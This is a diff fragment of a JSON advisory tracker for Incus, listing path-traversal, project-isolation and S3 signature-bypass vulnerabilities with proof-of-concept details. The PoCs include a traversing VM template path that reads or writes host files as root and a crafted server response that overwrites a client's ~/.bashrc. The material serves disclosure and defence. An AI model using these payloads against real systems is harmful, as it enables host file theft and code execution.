invoked from `generateConfigShare` on **VM start**, so the static call path is strong. **Reference remediation.** Apply incus's own LXC-driver guards (the `filepath.Base` reject + `os.OpenRoot` confinement) to `driver_qemu.go` \u2192 `templateApplyNow`, covering both the read and the write. For the **read** specifically, upstream **LXD** is a second reference (it confines the QEMU read via `d.OpenTemplates()`, an `os.Root`). Note that **LXD does *not* confine the QEMU write either**, so the write reference is incus's own LXC guard, not LXD. **Scope / honesty.** Source-confirmed via a white-box review of the public repo at fresh HEAD (`ccdf811`) plus an LXD cross-reference; the guard absence was grep-verified. A live-VM end-to-end PoC is the documented next step. The read is a clean arbitrary host-file disclosure. The write is a genuine root-owned arbitrary-file-create primitive, but the created path is **forced to carry a `.out` suffix**, which constrains a direct write-to-RCE, so this is framed as **High**, not a 9.9 Critical, and no RCE is claimed without a `.out`-compatible execution path. ### PoC On a self-hosted **incus 7.2.0 or later**, craft a VM image whose `metadata.yaml` contains: ```yaml templates: '/x': template: '../../../../../../tmp/incus-poc' when: - start ``` Launch the VM, then confirm on the host: ```bash ls -l /tmp/incus-poc.out # created by incusd (root) = out-of-templates write ``` Separately, a `tpl.Template` of `../../etc/hostname` is read and disclosed into the guest config drive (`config/files/*.out`). ### Impact **Path traversal (CWE-22) + link following (CWE-59)** in the VM/QEMU template path. An authenticated user able to create/launch a VM from a custom image, or restore a VM backup, can: 1. **read arbitrary host files as root**, disclosed into their guest (e.g. `/etc/shadow`), and 2. **create root-owned files** with attacker-controlled content anywhere on the host (`.out`-suffixed). **Undisclosed.** The authoritative public dissection ([Snyk Labs: *Newlines, Symlinks, and Arbitrary Writes: Dissecting High-Severity Vulnerabilities in Incus*](https://labs.snyk.io/resources/incus-vulnerabilities-newline-symlink-arbitrary-writes/)) covers **only** `driver_lxc.go` and explicitly notes the VM drivers were not separately audited; no incus issue, PR, or CVE names `driver_qemu.go` \u2192 `templateApplyNow`. --- **Reporter:** Kingsley Olukanni (GitHub: **babakizo420**).",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -2292,8 +2292,8 @@
             },
             "CVE-2026-81499": {
                 "cve_id": "CVE-2026-81499",
-                "title": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network addre",
-                "description": "[GHSA-6v6x-387m-rj4w: Project restriction bypass on network address sets]",
+                "title": "Project restriction bypass on network address sets",
+                "description": "### Summary The network address set API is missing from the auth object project-expansion switch, so a project-restricted client can read and rewrite the default project's address sets. ### Details **Project confinement bypass on the network address set API** All six handlers in cmd/incusd/network_address_sets.go resolve the effective project via project.NetworkProject(), which returns 'default' when the project does not have features.networks set. But expandProject in cmd/incusd/daemon.go (lines 326-372) has no branch for auth.ObjectTypeNetworkAddressSet, so the authorization object is constructed with the requested project instead of the effective one. Verified against the switch at HEAD c0ca96d, which handles Profile (352), StorageBucket (354), StorageVolume (356), NetworkZone (363), Image/ImageAlias (365) and Network/NetworkACL (367) \u2014 NetworkAddressSet appears nowhere. Consequence: a certificate restricted to project P can read, rewrite, rename and delete the default project's address sets, which feed network ACL rules for every other tenant. features.networks defaults to false at project creation, so this is the default state of every project, not an unusual configuration. Supporting evidence: the sibling auth.ObjectTypeNetworkACL is expanded on the same line, and the address-set LIST endpoint filters on the real project and correctly returns nothing \u2014 this is the only mismatch found when diffing every cmd/incusd caller of an effective-project resolver against the object types passed to allowPermission. ### Suggested fixes Add auth.ObjectTypeNetworkAddressSet to the expansion in expandProject alongside Network and NetworkACL. More durably, make expandProject fail closed on an unhandled object type rather than returning the requested project, so a future new API cannot repeat this. ### Tooling and credit AI assistance was used during investigation; the reporter read the full expandProject switch and confirmed the missing object type against its expanded siblings at HEAD, and independently confirmed the os.WriteFile call in instance_metadata.go.",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -2305,8 +2305,8 @@
             },
             "CVE-2026-81500": {
                 "cve_id": "CVE-2026-81500",
-                "title": "Incus CLI path traversal when exporting an image from a malicious server",
-                "description": "## Summary The `incus` CLI, when exporting or copying an image from a remote server into a directory target, takes the local filename verbatim from the server-controlled `Content-Disposition: filename=` for UNIFIED images and passes it into `os.Rename(tmp, filepath.Join(target, resp.MetaName))` with no `filepath.Base` / traversal check. A malicious or MITM'd image server that the user points the CLI at can therefore write the downloaded (attacker-controlled) image bytes to an arbitrary path on the client, escaping the export directory \u2014 e.g. overwrite `~/.bashrc` \u2192 code execution on the client's next shell. ## Root Cause On the unified-image branch (`client/incus_images.go:339`, forced by the server not sending a `multipart/form-data` Content-Type), `mime.ParseMediaType(Content-Disposition)` yields `filename = cdParams['filename']` and `resp.MetaName = filename` is stored verbatim at `client/incus_images.go:356` with NO `filepath.Base`. It then reaches `os.Rename(targetMeta, filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. The multipart/split branch is SAFE because it uses `multipart.Part.FileName()`, which basenames the value. The hash guard `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)` at `client/incus_images.go:360` is bypassable: (a) the server sets response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped entirely; or (b) when the user passes an alias, `fingerprint` is itself server-controlled via `dereferenceAlias`\u2192`GetImageAliasType().Target` (`image.go:133-142`), so the attacker sets it to `sha256(malicious_bytes)` and `HasPrefix` passes. ## Impact Arbitrary file overwrite on the client as the invoking user \u2192 code execution (shell rc, cron, SSH config). The attacker is a remote/MITM'd image server; the victim must run `incus image export`/`copy` into a directory target from that remote. Pointing the CLI at public/untrusted image servers is a normal Incus workflow. ## Proof of Concept ``` # Malicious image server. Victim runs: incus image export evil:someimg ~/Downloads/ # Server responds to the /export request with: # HTTP/1.1 200 OK # X-Incus-Type: oci # bypass (a): skips hash check # Content-Type: application/octet-stream # forces unified branch (not multipart) # Content-Disposition: attachment; filename='../../../../home/victim/.bashrc' # <attacker payload bytes> # Client: resp.MetaName = '../../../../home/victim/.bashrc' (no filepath.Base) # os.Rename(tmp, filepath.Join('~/Downloads', resp.MetaName)) -> overwrites ~/.bashrc # -> code execution as victim on next interactive shell. ``` ## Attack Chain 1. **Entry:** victim runs `incus image export evil:x ~/Downloads/` (directory target). `IsDir(target)` true \u2192 `cmd/incus/image.go:569-575`, `606` `GetImageFile`, `639-641` rename branch. - **Guard:** none on the server-provided name. 2. **Branch force:** attacker server responds with a non-`multipart/form-data` Content-Type \u2192 unified branch `client/incus_images.go:339` (multipart branch `:286` skipped). - **Guard:** branch selection. **Bypass proof:** attacker controls Content-Type. 3. **Tainted name:** `mime.ParseMediaType(Content-Disposition)` \u2192 `resp.MetaName = filename` at `client/incus_images.go:356`, NO `filepath.Base`. - **Guard:** `mime.ParseMediaType` filename param. **Bypass proof:** `go run` confirmed it returns `../../../../home/victim/.bashrc` verbatim, unlike `part.FileName()` (basenames to `evil`) in the multipart branch (`:310`). 4. **Hash guard:** `client/incus_images.go:360` `if imageType != 'oci' && !strings.HasPrefix(hash, fingerprint)`. - **Bypass proof (a):** response header `X-Incus-Type: oci` (`:254`) \u2192 check skipped (source-verified). **(b):** alias-derived `fingerprint` = `GetImageAliasType().Target` is server-controlled (`image.go:133-142`) \u2192 attacker sets `sha256(malicious)`; `HasPrefix` passes (source-verified). 5. **Sink:** `os.Rename(targetMeta, filepath.Join('~/Downloads', '../../../../home/victim/.bashrc'))` at `cmd/incus/image.go:641` \u2192 writes attacker bytes to `~/.bashrc`. - **Bypass proof:** `go run` confirmed `os.Rename` across the collapsed `../` escaped the dir and overwrote the target. 6. **Impact:** arbitrary file overwrite on the client as the invoking user \u2192 RCE. ## Bypass Evidence - `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization; `os.Rename(...filepath.Join(target, resp.MetaName))` at `cmd/incus/image.go:641`. `grep filepath.Base` \u2192 only in the upload/import path (`image.go:834/836`), never between `:356` and `:641`. - `go run` proofs: `mime.ParseMediaType` returns `../` verbatim; `part.FileName()` basenames (safe branch asymmetry); `os.Rename` across `../` overwrites the escaped target. - DISTINCT from GHSA-f6m5-xw2g-xc4x / CVE-2026-48769: that advisory's DETAILS are the DAEMON (`cmd/incusd/daemon_images.go`, `os.Create`, trusting `Incus-Image-Hash` for `source.type=url`, writing under `/var/lib/incus/images/`). This report covers the CLI CLIENT (`client/incus_images.go` + `cmd/incus/image.go`, `os.Rename`, trusting `Content-Disposition`, writing on the user's local filesystem). Different component, tainted header, sink, and fix. ## Affected Versions `<= 7.3.0` (Go module `github.com/lxc/incus/v7`). Sinks verified present on the v7.3.0 release tag (`90429bf`): `resp.MetaName = filename` at `client/incus_images.go:356` with no sanitization, the hash gate still keyed on the server-supplied `X-Incus-Type` header at `:254`/`:360`, and the `os.Rename` sink at `cmd/incus/image.go:641`. Confirmed still present on `main`. ## Suggested Fix Apply `filepath.Base` to `resp.MetaName` (and `resp.RootfsName`) on the unified-image branch before `os.Rename`, mirroring the multipart branch's use of `part.FileName()`; reject any name containing path separators or `..`. --- Reported by zx (Jace) \u2014 GitHub: @manus-use",
+                "title": "[Unknown description]",
+                "description": "[Unknown description]",
                 "severity": "",
                 "status": "open",
                 "events": [
@@ -2370,8 +2370,8 @@
             },
             "GHSA-jh4v-j34r-2mgh": {
                 "cve_id": "GHSA-jh4v-j34r-2mgh",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Project restriction bypass for custom volume copy with omitted source type",
+                "description": "### Summary Creating a custom storage volume with a `source` volume but no `source.type` is handled as a copy, but the source volume access check only applies when `source.type` is explicitly set to `copy`. A request that omits the type goes straight to the copy code path with a caller-controlled `source.project`. ### Impact Any client allowed to create custom volumes in a project can copy any custom volume from any other project on the server, including its snapshots and configuration, and read its contents, defeating project isolation. ### Details The `POST /1.0/storage-pools/{pool}/volumes/custom` endpoint only checks `can_create_storage_volumes` on the target project. The `can_view` check on the source volume added for CVE-2026-55621 lives in the `copy` arm of the source type switch, while the empty type arm calls the same copy helper without it. The official client always sets `source.type` to `copy`, so the empty form is only reachable through a crafted request.",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -2396,8 +2396,8 @@
             },
             "GHSA-mmj7-8rgf-mx2h": {
                 "cve_id": "GHSA-mmj7-8rgf-mx2h",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Read of other bucket objects via unsigned header on presigned S3 upload URL",
+                "description": "### Summary The in-process S3 server used for storage buckets on local storage pools verifies SigV4 signatures over the headers listed by the client in `X-Amz-SignedHeaders`, but never checks that every `x-amz-*` header present on the request is in that list. The SigV2 presigned path doesn't include those headers in the string to sign at all. A request can therefore carry unsigned `x-amz-*` headers that change how it is handled, which AWS S3 refuses. ### Impact Anyone holding a presigned upload URL for a single object, without any bucket credentials, can add an unsigned `X-Amz-Copy-Source` header and have the server copy any other object in the same bucket onto the granted key, with the copy performed under the signer's credentials. If the holder can also read the target key, for instance through a matching presigned download URL, this discloses the contents of arbitrary objects in the bucket. The response also leaks the ETag of the source object. All storage pool drivers using the built-in S3 server are affected. Ceph radosgw buckets are not, and the bucket listener (`core.storage_buckets_address`) is disabled by default. ### Details The canonical request only iterates over the client-supplied signed header list, so headers outside that list are never seen by the signature check. The object handler routes any PUT carrying `X-Amz-Copy-Source` to the copy path based on the header alone, so a write grant becomes a read within the bucket. The same gap exists on the `Authorization` header path, and the SigV2 presigned path omits the `CanonicalizedAmzHeaders` section entirely. ### Workarounds Don't hand out presigned URLs for buckets that also hold sensitive objects, or keep the bucket listener disabled.",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
@@ -2422,8 +2422,8 @@
             },
             "GHSA-x8gj-2q73-qr6j": {
                 "cve_id": "GHSA-x8gj-2q73-qr6j",
-                "title": "Restricted client can read storage bucket keys in the default project",
-                "description": "### Summary The storage bucket key endpoints, `GET /1.0/storage-pools/{pool}/buckets/{bucket}/keys` and `GET .../keys/{key}`, only require `can_view` on the bucket and return the S3 access key and secret key. When using the TLS authorizer, a restricted client certificate is granted read-only access to buckets in the `default` project, so that projects without `features.storage.buckets` can use them. That read-only exception therefore also hands out the bucket credentials. ### Impact A client with a restricted TLS certificate scoped to any project can read the access key and secret key of every bucket in the `default` project, then use them directly against the S3 endpoint to read, modify or delete the objects in those buckets. Only the TLS authorizer is affected. OpenFGA deployments are not. ### Details Bucket keys are credentials rather than metadata, so both key retrieval endpoints now require `can_edit` on the bucket. Listing buckets and reading bucket details remain available under `can_view`. ### Workarounds Don't keep buckets in the `default` project on servers that issue restricted client certificates, or rotate the keys of any bucket a restricted client may have read.",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
                 "severity": "HIGH",
                 "status": "open",
                 "events": [
